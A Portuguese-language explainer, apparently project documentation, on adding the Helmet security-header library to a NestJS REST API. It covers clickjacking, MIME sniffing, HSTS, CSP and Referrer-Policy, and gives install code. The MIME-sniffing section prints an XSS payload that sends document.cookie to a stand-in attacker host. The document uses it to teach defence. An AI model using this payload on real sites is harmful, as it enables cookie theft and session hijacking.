# O que é o Helmet e por que usar

## O problema

Quando seu servidor responde uma requisição HTTP, ele devolve um body e também um conjunto de **headers**. A maioria dos frameworks (incluindo NestJS) não adiciona headers de segurança por padrão — o browser recebe a resposta sem nenhuma instrução sobre o que pode ou não fazer com ela.

O Helmet é uma biblioteca que adiciona esses headers automaticamente.

---

## O que cada header faz (com exemplos concretos)

### `X-Frame-Options: DENY`

**Sem ele:** qualquer site pode colocar sua aplicação dentro de um `<iframe>`:

```html
<!-- site malicioso em http://ataque.com -->
<iframe src="https://suaapi.com/login" style="opacity:0; position:absolute"></iframe>
<button onclick="...">Clique para ganhar prêmio</button>
```

O usuário clica no botão sem saber que está clicando no iframe da sua aplicação. Isso se chama **clickjacking**.

**Com Helmet:** o browser recusa renderizar sua página dentro de qualquer iframe.

---

### `X-Content-Type-Options: nosniff`

**Sem ele:** se você servir um arquivo `.json` com conteúdo HTML, o browser pode "adivinhar" que é uma página HTML e renderizá-la — executando scripts embutidos. Isso se chama **MIME sniffing**.

```
GET /uploads/perfil.json
Content-Type: application/json

<script>document.location='http://ataque.com?c='+document.cookie</script>
```

**Com Helmet:** o browser respeita o `Content-Type` declarado e nunca tenta adivinhar.

---

### `Strict-Transport-Security` (HSTS)

**Sem ele:** mesmo que você force HTTPS no servidor, o primeiro acesso do usuário pode ser HTTP. Um atacante em rede local (Wi-Fi público) intercepta esse primeiro request e faz um ataque **man-in-the-middle** antes do redirect para HTTPS.

**Com Helmet:** o browser memoriza que seu domínio sempre usa HTTPS e nunca tenta HTTP — nem na primeira vez, depois que visitou uma vez.

```
Strict-Transport-Security: max-age=15552000; includeSubDomains
```

---

### `Content-Security-Policy` (CSP)

**Sem ele:** se um XSS for injetado na sua página, o script tem liberdade total — pode ler cookies, fazer requests para outros domínios, etc.

**Com Helmet (CSP básico):** você declara de onde scripts podem vir. Scripts injetados de fora dessa lista são bloqueados pelo browser antes de executar.

```
Content-Security-Policy: default-src 'self'
```

> Para APIs REST puras (sem frontend próprio), o CSP tem impacto menor — ele protege páginas HTML, não JSON.

---

### `Referrer-Policy: no-referrer`

**Sem ele:** quando um usuário clica em um link da sua aplicação para um site externo, o browser envia um header `Referer` com a URL completa de onde ele estava:

```
Referer: https://suaapi.com/admin/users/123/dados-sensiveis
```

O site externo recebe essa URL — incluindo IDs e rotas internas.

**Com Helmet:** nenhuma URL interna vaza para sites externos.

---

## Por que é "uma linha"

O Helmet tem defaults seguros para todos esses headers. Você não precisa configurar nada:

```typescript
// main.ts
import helmet from 'helmet';

app.use(helmet()); // aplica todos os headers de uma vez
```

Se quiser customizar (ex: CSP mais restrito), pode passar opções:

```typescript
app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'"],
    },
  },
}));
```

---

## Relevância para este projeto

Este projeto é uma **API REST** consumida por um frontend separado. Isso significa:

| Header | Impacto neste projeto |
|---|---|
| `X-Frame-Options` | Médio — protege se o frontend for web |
| `X-Content-Type-Options` | Alto — o endpoint de upload retorna URLs de arquivos |
| `HSTS` | Alto — impede downgrade para HTTP em produção |
| `CSP` | Baixo — API JSON não renderiza HTML |
| `Referrer-Policy` | Médio — evita vazar rotas internas |

O maior risco concreto aqui é o endpoint de upload (`/attachments`): arquivos são salvos e retornados como URLs. Sem `X-Content-Type-Options`, um arquivo com conteúdo malicioso mas extensão de imagem pode ser interpretado incorretamente pelo browser do cliente.

---

## Instalação

```bash
npm install helmet
npm install -D @types/helmet
```

```typescript
// src/main.ts
import helmet from 'helmet';

app.use(helmet());
```
